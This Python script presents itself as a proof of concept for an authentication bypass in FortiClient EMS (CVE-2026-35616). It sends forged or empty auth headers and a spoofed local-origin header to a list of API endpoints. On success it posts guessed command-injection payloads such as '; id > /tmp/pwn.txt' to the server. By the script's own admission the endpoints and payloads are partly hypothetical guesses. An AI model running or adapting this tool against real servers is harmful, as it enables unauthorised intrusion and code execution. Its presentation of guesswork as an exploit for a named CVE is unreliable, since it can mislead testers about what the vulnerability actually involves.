#!/usr/bin/env python3
"""
PoC for CVE-2026-35616: FortiClient EMS API Authentication Bypass
Author: Tu Nombre
Description: This script checks for and demonstrates a critical authentication bypass
vulnerability in FortiClient EMS versions 7.4.5 through 7.4.6 (CVE-2026-35616).
An unauthenticated attacker can execute unauthorized code or commands via crafted requests.

DISCLAIMER: For educational and authorized security testing purposes only.
"""

import requests
import argparse
import json
import sys
import time
from urllib.parse import urljoin

# --- Constants ---
# Default paths and payloads for testing
DEFAULT_PATHS = [
    "/api/v1/auth/token",
    "/api/v2/auth/token",
    "/api/v1/system/status",
    "/api/v2/system/status",
    "/api/v1/endpoint/user/login", # Hypothetical endpoint
    "/api/v1/ems/serverinfo"      # Hypothetical endpoint
]

# User-Agent to mimic a legitimate browser or API client
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# A simple payload to test for RCE. This is a placeholder and might need to be adapted.
# For example, a command injection payload could look like: `; id > /tmp/pwn.txt`
# For now, we will focus on detecting the bypass.
RCE_PAYLOAD_PLACEHOLDER = "PLACEHOLDER_RCE_PAYLOAD"

def check_vulnerability(base_url, proxy=None):
    """
    Checks if the target FortiClient EMS is vulnerable by sending crafted requests
    to various API endpoints and analyzing the responses.
    """
    print(f"[*] Checking {base_url} for CVE-2026-35616...")
    
    vulnerable = False
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    if proxy:
        session.proxies.update({
            "http": proxy,
            "https": proxy
        })
        print(f"[*] Using proxy: {proxy}")

    # The core of the bypass is likely in the headers or the request structure.
    # We will try a few common bypass techniques.
    # 1. Try accessing a protected endpoint without any auth headers.
    # 2. Try with a fake or empty Authorization header.
    # 3. Try with a malformed JWT or API key.
    
    bypass_headers = [
        {}, # No auth headers
        {"Authorization": ""}, # Empty auth
        {"Authorization": "Bearer"}, # Malformed bearer
        {"X-API-Key": ""}, # Empty API key
        {"X-API-Key": "bypass"}, # Fake API key
        {"X-Forwarded-For": "127.0.0.1"}, # Try to trick it into thinking it's a local request
    ]

    for path in DEFAULT_PATHS:
        full_url = urljoin(base_url, path)
        print(f"\n[*] Testing endpoint: {full_url}")

        for headers in bypass_headers:
            try:
                print(f"    [*] Trying with headers: {headers}")
                response = session.get(full_url, headers=headers, timeout=10, verify=False)
                
                # Check for success status codes (2xx) which should not be possible without auth
                if 200 <= response.status_code < 300:
                    print(f"[+] POTENTIAL VULNERABILITY FOUND!")
                    print(f"[+] Endpoint {full_url} returned status {response.status_code} without valid authentication.")
                    print("[+] Response snippet:")
                    try:
                        # Pretty print JSON response if possible
                        json_data = response.json()
                        print(json.dumps(json_data, indent=2))
                    except json.JSONDecodeError:
                        print(response.text[:200]) # Print first 200 chars of text response
                    
                    # If we get a 200, we can be more confident. Let's try a POST request.
                    print("\n[*] Attempting a POST request to the same endpoint...")
                    post_response = session.post(full_url, headers=headers, json={"test": "data"}, timeout=10, verify=False)
                    if 200 <= post_response.status_code < 300:
                        print("[+] POST request also succeeded! This strongly indicates a bypass.")
                        vulnerable = True
                        # We can stop here as we have strong evidence
                        return True, full_url, headers
                    else:
                        print(f"[-] POST request failed with status {post_response.status_code}.")

                # Check for specific error messages that might leak information
                if "unauthorized" in response.text.lower() or "forbidden" in response.text.lower():
                    print(f"    [-] Correctly denied access (status {response.status_code}).")

            except requests.exceptions.RequestException as e:
                print(f"    [-] Error connecting to {full_url}: {e}")
                continue # Try next endpoint/header

    if not vulnerable:
        print("\n[-] No clear evidence of authentication bypass found on tested endpoints.")
        print("[-] The system might be patched, or the vulnerability requires a more specific payload.")
        return False, None, None

def attempt_exploitation(base_url, vulnerable_endpoint, bypass_headers, proxy=None):
    """
    Attempts to exploit the vulnerability. This is a placeholder as the exact
    RCE vector is unknown. It demonstrates the framework for exploitation.
    """
    print("\n" + "="*60)
    print("[*] ATTEMPTING EXPLOITATION (HYPOTHETICAL)")
    print("="*60)
    print("[!] This is a hypothetical exploitation framework.")
    print("[!] The actual RCE payload and endpoint are unknown at this time.")
    
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    session.headers.update(bypass_headers)
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})

    # Hypothetical scenario: The vulnerable endpoint allows command injection.
    # We will try to inject a simple `id` command.
    # The payload structure is a complete guess.
    exploitation_payloads = [
        {"command": f"; id > /tmp/pwn.txt"}, # Guess 1: Command injection in a "command" param
        {"cmd": f"; id > /tmp/pwn.txt"},    # Guess 2: Command injection in a "cmd" param
        {"exec": f"id > /tmp/pwn.txt"},     # Guess 3: Command injection in an "exec" param
        {"script": f"system('id > /tmp/pwn.txt')"} # Guess 4: Code injection
    ]
    
    for payload in exploitation_payloads:
        print(f"\n[*] Trying payload: {payload}")
        try:
            response = session.post(vulnerable_endpoint, json=payload, timeout=10, verify=False)
            if 200 <= response.status_code < 300:
                print("[+] Payload accepted by the server!")
                print("[!] Check the target server's filesystem for /tmp/pwn.txt to confirm RCE.")
                return True
            else:
                print(f"[-] Server rejected payload with status {response.status_code}.")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error sending payload: {e}")

    print("\n[-] Hypothetical exploitation attempts failed.")
    print("[-] Further manual analysis is required to determine the exact RCE vector.")
    return False


def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2026-35616 (FortiClient EMS Auth Bypass)")
    parser.add_argument("target", help="The base URL of the target FortiClient EMS (e.g., https://ems.example.com)")
    parser.add_argument("--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    # Disable SSL warnings for self-signed certificates common in EMS
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    print("=" * 60)
    print("CVE-2026-35616 - FortiClient EMS Authentication Bypass PoC")
    print("=" * 60)

    is_vulnerable, endpoint, headers = check_vulnerability(args.target, args.proxy)

    if is_vulnerable:
        print("\n[+] The target appears to be VULNERABLE.")
        attempt_exploitation(args.target, endpoint, headers, args.proxy)
    else:
        print("\n[-] The target does not appear to be vulnerable based on these tests.")
        print("[-] This does not guarantee it is not vulnerable, only that the bypass was not detected.")

if __name__ == "__main__":
    main()
